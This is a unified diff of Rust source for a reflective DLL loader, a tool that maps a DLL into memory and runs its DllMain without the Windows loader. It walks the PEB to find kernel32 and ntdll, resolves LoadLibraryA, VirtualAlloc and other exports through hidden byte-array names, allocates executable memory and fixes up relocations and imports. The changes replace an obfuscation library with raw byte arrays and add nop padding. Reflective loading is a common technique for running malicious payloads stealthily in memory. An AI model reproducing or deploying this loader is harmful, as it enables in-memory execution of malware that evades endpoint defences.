@@ -1,4 +1,4 @@
-use std::{arch::asm, ffi::{CStr}, collections::BTreeMap, mem::size_of};
+use std::{arch::asm, mem::size_of};
 
 use winapi::{um::{winnt::{PIMAGE_DOS_HEADER, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, PIMAGE_SECTION_HEADER, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, PIMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, DLL_PROCESS_ATTACH, IMAGE_REL_BASED_HIGHLOW}}, shared::{minwindef::{HMODULE, FARPROC, LPVOID, DWORD, HINSTANCE, BOOL}, ntdef::{LPCSTR, HANDLE, PVOID, NTSTATUS}, basetsd::SIZE_T}, ctypes::c_void};
 use ntapi::{ntpebteb::PTEB, ntldr::{PLDR_DATA_TABLE_ENTRY}, ntpsapi::PEB_LDR_DATA};
@@ -80,11 +80,24 @@ pub extern "system" fn reflective_loader(dll_bytes: *mut c_void) {
 
     // STEP 4: process our images import table...
     //log::info!("[+] Resolving Imports");
-    unsafe { resolve_imports(new_module_base) };
+    unsafe { resolve_imports(new_module_base as _) };
+
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
 
     // STEP 5: call our images entry point
     let entry_point = unsafe { new_module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };
     //log::info!("[+] New Module Base {:?} + AddressOfEntryPoint {:#x} = {:#x}", new_module_base, unsafe { (*nt_headers).OptionalHeader.AddressOfEntryPoint }, entry_point);
+
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+
+
 
     // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
     unsafe { NT_FLUSH_INSTRUCTION_CACHE.unwrap()(-1 as _, std::ptr::null_mut(), 0) };
@@ -93,6 +106,16 @@ pub extern "system" fn reflective_loader(dll_bytes: *mut c_void) {
     
     #[allow(non_snake_case)]
     let DllMain = unsafe { std::mem::transmute::<_, fnDllMain>(entry_point) };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
+    unsafe { asm!("nop") };
 
     // STEP 6: The DLLMain function to be executed
     unsafe { DllMain(std::ptr::null_mut(), DLL_PROCESS_ATTACH, std::ptr::null_mut()) };
@@ -142,7 +165,6 @@ unsafe fn rebase_image(module_base: usize, new_module_base: *mut c_void) {
     let base_relocation_end = base_relocation as usize 
         + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;
     
-
     while (*base_relocation).VirtualAddress != 0u32 && (*base_relocation).VirtualAddress as usize <= base_relocation_end && (*base_relocation).SizeOfBlock != 0u32 {
         
         // Get the VirtualAddress, SizeOfBlock and entries count of the current _IMAGE_BASE_RELOCATION block
@@ -318,11 +340,21 @@ unsafe fn copy_sections_to_local_process(module_base: usize) -> *mut c_void { //
         //log::info!("Size: {:?}", size);
 
         // copy section headers into the local process (allocated memory)
+        /* 
         std::ptr::copy_nonoverlapping(
             source as *const std::os::raw::c_void, // this causes problems if it is winapi::ctypes::c_void but ffi works for ffi
             destination as *mut _,
             size,
-        )
+        )*/
+
+        let source_data = core::slice::from_raw_parts(source as *const u8, size);
+        
+        for x in 0..size {
+            let src_data = source_data[x];
+            let dest_data = destination.add(x);
+            *dest_data = src_data;
+        }
+
     }
 
     new_module_base
@@ -350,56 +382,93 @@ fn get_peb_ldr() -> usize {
 #[no_mangle]
 pub fn set_exported_functions_by_name() {
 
-    let kernel32_unicode = create_unicode_string(obfstr::wide!("KERNEL32.DLL"));
-    let ntdll_unicode = create_unicode_string(obfstr::wide!("ntdll.dll"));
+    let kernel32_bytes: [u16; 13] = [75, 69, 82, 78, 69, 76, 51, 50, 46, 68, 76, 76, 0];
+    let ntdll_bytes: [u16; 10] = [110, 116, 100, 108, 108, 46, 100, 108, 108, 0];
+
+    let load_librarya_bytes: [i8; 13] = [76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 65, 0];
+    let get_proc_address_bytes: [i8; 15] = [71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0];
+    let virtual_alloc_bytes: [i8; 13] = [86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99, 0];
+    let nt_flush_instruction_cache_bytes: [i8; 24] = [78, 116, 70, 108, 117, 115, 104, 73, 110, 115, 116, 114, 117, 99, 116, 105, 111, 110, 67, 97, 99, 104, 101, 0];
+
 
     // get kernel32 base address via name
-    let kernel32_base = unsafe { get_loaded_modules_by_name(kernel32_unicode).expect("failed to kernel32 by name") };
+    let kernel32_base = unsafe { get_loaded_modules_by_name(kernel32_bytes.as_ptr()).expect("failed to kernel32 by name") };
     //log::info!("[+] KERNEL32: {:?}", kernel32_base);
     
     // get ntdll base address via name
-    let ntdll_base = unsafe { get_loaded_modules_by_name(ntdll_unicode).expect("failed to ntdll by name") };
+    let ntdll_base = unsafe {  get_loaded_modules_by_name(ntdll_bytes.as_ptr()).expect("failed to ntdll by name") };
     //log::info!("[+] NTDLL: {:?}", ntdll_base);
 
     // get exports by name and store the their virtual address
     //kernel32
-    let loadlibrarya_address = get_exports_by_name(kernel32_base, "LoadLibraryA").expect("failed to get LoadLibraryA by name");
+    let loadlibrarya_address = unsafe { get_module_exports(kernel32_base, load_librarya_bytes.as_ptr()).expect("failed to get LoadLibraryA by name") };
     unsafe { LOAD_LIBRARY_A = Some(std::mem::transmute::<_, fnLoadLibraryA>(loadlibrarya_address)) };
     //log::info!("[+] LoadLibraryA {:?}", loadlibrarya_address);
 
-    let getprocaddress_address = get_exports_by_name(kernel32_base, "GetProcAddress").expect("failed to get GetProcAddress by name");
+    let getprocaddress_address = unsafe { get_module_exports(kernel32_base, get_proc_address_bytes.as_ptr()).expect("failed to get GetProcAddress by name") };
     unsafe { GET_PROC_ADDRESS = Some(std::mem::transmute::<_, fnGetProcAddress>(getprocaddress_address)) };
     //log::info!("[+] GetProcAddress {:?}", getprocaddress_address);
 
-    let virtualalloc_address = get_exports_by_name(kernel32_base, "VirtualAlloc").expect("failed to get VirtualAlloc by name");
+    let virtualalloc_address = unsafe { get_module_exports(kernel32_base, virtual_alloc_bytes.as_ptr()).expect("failed to get VirtualAlloc by name") };
     unsafe { VIRTUAL_ALLOC = Some(std::mem::transmute::<_, fnVirtualAlloc>(virtualalloc_address)) };
     //log::info!("[+] VirtualAlloc {:?}", virtualalloc_address);
 
     //ntdll
-    let ntflushinstructioncache_address = get_exports_by_name(ntdll_base, "NtFlushInstructionCache").expect("failed to get NtFlushInstructionCache by name");
+    let ntflushinstructioncache_address = unsafe { get_module_exports(ntdll_base, nt_flush_instruction_cache_bytes.as_ptr()).expect("failed to get NtFlushInstructionCache by name") };
     unsafe { NT_FLUSH_INSTRUCTION_CACHE = Some(std::mem::transmute::<_, fnNtFlushInstructionCache>(ntflushinstructioncache_address)) };
     //log::info!("[+] NtFlushInstructionCache {:?}", ntflushinstructioncache_address);
 }
 
-/// Gets exports by name
+/// Gets loaded modules by name
 #[no_mangle]
-fn get_exports_by_name(module_base: *mut u8, module_name: &str) -> Option<*mut u8> {
+pub unsafe fn get_loaded_modules_by_name(module_name: *const u16) -> Option<*mut u8> {
+    let peb_ptr_ldr_data = get_peb_ldr() as *mut PEB_LDR_DATA;
+    //log::info!("[+] PEB_LDR_DATA {:?}", peb_ptr_ldr_data);
+	
+    let mut module_list = (*peb_ptr_ldr_data).InLoadOrderModuleList.Flink as PLDR_DATA_TABLE_ENTRY;
 
-    // loop through the module exports to find export by name
-    for (name, addr) in unsafe { get_module_exports(module_base) } {
-        if name == module_name {
-            return Some(addr as _);
-        }
-    }
+    while !(*module_list).DllBase.is_null() {
+
+        let dll_name = (*module_list).BaseDllName.Buffer;
+        
+        if compare_raw_str(module_name, dll_name) {
+            return Some((*module_list).DllBase as _);
+		}
+
+        module_list = (*module_list).InLoadOrderLinks.Flink as PLDR_DATA_TABLE_ENTRY;
+	}
 
     return None;
 }
 
+use num_traits::Num;
+pub fn compare_raw_str<T>(s: *const T, u: *const T) -> bool
+where
+    T: Num,
+{
+    unsafe {
+        let u_len = (0..).take_while(|&i| !(*u.offset(i)).is_zero()).count();
+        let u_slice = core::slice::from_raw_parts(u, u_len);
+
+        let s_len = (0..).take_while(|&i| !(*s.offset(i)).is_zero()).count();
+        let s_slice = core::slice::from_raw_parts(s, s_len);
+
+        if s_len != u_len {
+            return false;
+        }
+        for i in 0..s_len {
+            if s_slice[i] != u_slice[i] {
+                return false;
+            }
+        }
+        return true;
+    }
+}
+
 /// Retrieves all function and addresses from the specfied modules
 #[no_mangle]
-unsafe fn get_module_exports(module_base: *mut u8) -> BTreeMap<String, usize> {
-    let mut exports = BTreeMap::new();
-    
+unsafe fn get_module_exports(module_base: *mut u8, module_name: *const i8) -> Option<usize> {
+
     let dos_header = module_base as PIMAGE_DOS_HEADER;
 
     #[cfg(target_arch = "x86")]
@@ -438,123 +507,10 @@ unsafe fn get_module_exports(module_base: *mut u8) -> BTreeMap<String, usize> {
 
         let name = (module_base as usize + names[i as usize] as usize) as *const i8;
 
-        if let Ok(name) = CStr::from_ptr(name).to_str() {
-
+        if compare_raw_str(module_name, name as _) {
             let ordinal = ordinals[i as usize] as usize;
-
-            exports.insert(
-                name.to_string(),
-                module_base as usize + functions[ordinal] as usize,
-            );
+            return Some(module_base as usize + functions[ordinal] as usize);
         }
     }  
-    exports
+    None
 }
-
-/// Gets loaded modules by name
-#[no_mangle]
-pub unsafe fn get_loaded_modules_by_name(module_name: UNICODE_STRING) -> Option<*mut u8> {
-    let peb_ptr_ldr_data = get_peb_ldr() as *mut PEB_LDR_DATA;
-    //log::info!("[+] PEB_LDR_DATA {:?}", peb_ptr_ldr_data);
-	
-    let mut ldr_data_ptr = (*peb_ptr_ldr_data).InLoadOrderModuleList.Flink as PLDR_DATA_TABLE_ENTRY;
-
-    while !ldr_data_ptr.is_null() {
-
-        let dll_name = (*ldr_data_ptr).BaseDllName;
-        let dll_buffer = (*ldr_data_ptr).BaseDllName.Buffer;
-
-        if dll_buffer.is_null() {
-            break;
-        }
-
-        let dll_name_wstr = core::slice::from_raw_parts(dll_buffer, dll_name.Length as usize / 2);
-
-        //log::info!("[+] {:?}", String::from_utf16_lossy(dll_name_wstr));
-
-        let module_name_wsr = core::slice::from_raw_parts(module_name.Buffer, module_name.Length as usize / 2);
-        
-        //crash is before this. nops used for debugging.
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-
-        if dll_name_wstr != module_name_wsr {
-            ldr_data_ptr = (*ldr_data_ptr).InLoadOrderLinks.Flink as PLDR_DATA_TABLE_ENTRY;
-            continue;
-		}
-    
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-        asm!("nop");
-
-        return Some((*ldr_data_ptr).DllBase as _);
-	}
-
-    return None;
-}
-
-/*
-/// Compares a UNICODE_STRING (*mut 16) with a slice and returns true if equal
-fn is_equal(pointer: *mut u16, length: usize, against: &str) -> bool {
-    // Create slice not including the null-terminator
-    let slice = unsafe { std::slice::from_raw_parts(pointer, length -1) };
-    slice.iter().zip(against.encode_utf16()).all(|(a, b)| *a == b)
-} */
-
-
-use winapi::shared::ntdef::UNICODE_STRING;
-
-pub fn create_unicode_string(s: &[u16]) -> UNICODE_STRING {
-    let len = s.len();
-
-    let n = if len > 0 && s[len - 1] == 0 { len - 1 } else { len };
-
-    UNICODE_STRING {
-        Length: (n * 2) as u16,
-        MaximumLength: (len * 2) as u16,
-        Buffer: s.as_ptr() as _,
-    }
-}
-
-
-/* 
-/// Relative Virtual Address to file offset pointer
-unsafe fn rva_to_file_offset_pointer(module_base: usize, mut rva: u32) -> usize {
-    
-    let dos_header = module_base as PIMAGE_DOS_HEADER;
-
-    #[cfg(target_arch = "x86")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
-    #[cfg(target_arch = "x86_64")]
-    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;
-
-    let ref_nt_headers = &*nt_headers;
-
-    let section_header = ((&ref_nt_headers.OptionalHeader as *const _ as usize) 
-        + (ref_nt_headers.FileHeader.SizeOfOptionalHeader as usize)) as PIMAGE_SECTION_HEADER;
-
-    let number_of_sections = (*nt_headers).FileHeader.NumberOfSections;
-    
-    for i in 0..number_of_sections as usize {
-
-        let virt_address = (*section_header.add(i)).VirtualAddress;
-        let virt_size = (*section_header.add(i)).Misc.VirtualSize();
-        
-        if virt_address <= rva && virt_address + virt_size > rva {
-
-            rva -= (*section_header.add(i)).VirtualAddress;
-            rva += (*section_header.add(i)).PointerToRawData;
-            
-            return module_base + rva as usize;
-        }
-    }
-
-    return 0;
-}
-*/
